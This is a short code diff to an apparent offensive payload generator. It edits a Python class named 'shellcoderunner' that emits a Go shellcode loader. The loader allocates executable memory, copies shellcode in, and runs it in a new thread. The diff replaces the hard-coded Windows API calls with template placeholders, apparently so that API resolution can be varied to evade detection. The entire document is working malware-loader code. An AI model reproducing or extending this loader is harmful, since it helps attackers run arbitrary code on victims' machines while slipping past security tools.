@@ -16,15 +16,11 @@ class shellcoderunner:
         return """
     {transformers}
 
-	addr, _ := windows.VirtualAlloc(uintptr(0), uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
+	addr, _, _ := {VirtualAlloc}(uintptr(0), uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
 
-	ntdll := windows.NewLazySystemDLL("ntdll.dll")
-	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
-	RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
+	{RtlCopyMemory}(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
 
-	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
-	CreateThread := kernel32.NewProc("CreateThread")
-	thread, _, _ := CreateThread.Call(0, 0, addr, uintptr(0), 0, 0)
+	thread, _, _ := {CreateThread}(0, 0, addr, uintptr(0), 0, 0)
 
-	windows.WaitForSingleObject(windows.Handle(thread), 0xFFFFFFFF)
+	{WaitForSingleObject}(thread, 0xFFFFFFFF)
 """
